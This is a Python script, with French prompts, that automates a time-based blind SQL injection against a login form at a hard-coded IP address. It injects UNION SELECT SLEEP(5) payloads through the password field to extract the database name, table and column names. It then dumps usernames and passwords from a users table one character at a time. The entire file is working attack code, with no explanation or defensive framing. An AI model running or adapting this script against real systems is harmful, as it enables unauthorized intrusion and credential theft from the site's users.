import requests
import time

def db_name():
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    a=0
    db = []
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    global table 
    table = ""

    for letter in dictionary:
        for num in range(1, 10):
            usr = "idc"
            nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
            passwd_type = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd_type})
            end_time = time.time()
            total_time = end_time - start_time
            if total_time >= TIME:
                table = nums
                break
        if total_time >= TIME:
            break
 
 
    print(table)



    for i in range(1, 20):
        for j in range(0, len(dictionary)):
            usr = "idc"
            passwd = "' UNION SELECT SLEEP(5)" + table + " where database() like '" + texte + dictionary[j] + "%' -- "

            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            """print(total_time)
            print(dictionary[j])"""
            a += 1
            print(a)
            if a > 27:
                break
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    print(texte)
    db.append(texte)
    print(db)

    b=0
    for x in db:
        b += 1
        """print("" + b + "" + db[x] + "|")"""
        """print(str(a) + x)"""
        print("Database {} : {} ".format(b, x))
    
    c = int(input("Choisissez le numéro correspondant au nom de la base de donnée sur laquelle vous voulez continué : "))

    print("Vous avez choisi {}. ".format(db[c-1]))
    final_db=""
    jsp = final_db + "".join(db[c-1])
    print(jsp)
    return jsp

def table_name(database):
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    tables_name=[]
    a=0
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 27:
                if texte != "":
                    """enlever """
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    tables_name.append(texte)
                    texte = ""
                    a=0
                    break
                else:
                    break
            usr = "idc"
            passwd = "' UNION SELECT SLEEP(5)" + table + " TABLE_NAME FROM information_schema.tables WHERE table_schema='" + database + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            """print(total_time)
            print(dictionary[j])"""
            a += 1
            print(texte)
            print(tables_name)
            print(a)
            
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    print(tables_name)
    b=0
    for x in tables_name:
        b += 1
        print("Table {} : {} ".format(b, x))
    
    c = int(input("Choisissez le numéro correspondant au nom de la table sur laquelle vous voulez continué : "))

    print("Vous avez choisi {}. ".format(tables_name[c-1]))
    final_db=""
    jsp2 = final_db + "".join(tables_name[c-1])
    print(jsp2)
    return jsp2

    """ fonctionne 
    final_name = "".join(tables_name[b-1])
    print(final_name)"""



def column_name(database, nom_table):
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    columns_name=[]
    a=0
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 27:
                if texte != "":
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    columns_name.append(texte)
                    texte = ""
                    a=0
                    break
                else:
                    break
            usr = "idc"
            passwd = "' UNION SELECT SLEEP(5)" + table + " COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + nom_table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1
            print(texte)
            print(columns_name)
            print(a)
            
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    print(columns_name)
    b=0
    for x in columns_name:
        b += 1
        print("Table {} : {} ".format(b, x))
    c = int(input("Choisissez le numéro correspondant au nom de la colonne sur laquelle vous voulez continué : "))
    print("Vous avez choisi {}. ".format(columns_name[c-1]))
    final_db=""
    jsp3 = final_db + "".join(columns_name[c-1])
    print(jsp3)
    return jsp3


def column_dump(database, nom_table):
    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    columns_name=[]
    columns2_name=[]
    a=0
    texte = ""
    texte2 = ""
    TIME = 5
    c=0
    d=0
    tab=""
    global r
    r = 0
    global s
    s = 0
    global t
    t = 0
    global u
    u = 0
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 50):
        for j in range(0, len(dictionary)):
            if a > 31:
                if texte != "":
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    columns_name.append(texte)
                    texte = ""
                    a=0
                    tab = "Element avec id " + str(s) + " a comme mdp " + columns_name[c] +"."
                    print(tab)
                    c+=1
                    s = 0
                    break
                elif texte2 != "":
                    rm_letter = texte2[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    columns2_name.append(texte2)
                    texte2= ""
                    a=0
                    tab2 = "Element avec id " + str(u) + " a comme username " + columns2_name[d] +"."
                    print(tab2)
                    d+=1
                    u = 0
                    break
                else:
                    break

            for i in range(1,4):
                usr = "idc"
                start_time = time.time()
                passwd = "' UNION SELECT SLEEP(5)" + table + " username FROM users WHERE id = '" + str(i) + "' and password like '" + texte + dictionary[j] + "%' -- "
                response = requests.post(url, data={'username': usr, 'password': passwd})
                """print(passwd)"""
                end_time = time.time()
                total_time = end_time - start_time
                r += 1
                if total_time >= TIME:
                    texte += dictionary[j]
                    print(texte)
                    s = r
                    i += 1
                    j = 0
                    a = 0
                    r = 0
                    break
            for i in range(1,4):
                usr = "idc"
                start_time = time.time()
                passwd = "' UNION SELECT SLEEP(5)" + table + " username FROM users WHERE id = '" + str(i) + "' and username like '" + texte2 + dictionary[j] + "%' -- "
                response = requests.post(url, data={'username': usr, 'password': passwd})
                """print(passwd)"""
                end_time = time.time()
                total_time = end_time - start_time
                t += 1  
                if total_time >= TIME:
                    texte2 += dictionary[j]
                    print(texte2)
                    u = t
                    i += 1
                    j = 0
                    a = 0
                    t = 0
                    break
            a += 1


nom_base_de_donnée = db_name()
nom_table = table_name(nom_base_de_donnée)
nom_colonne = column_name(nom_base_de_donnée, nom_table)
column_dump(nom_base_de_donnée, nom_table)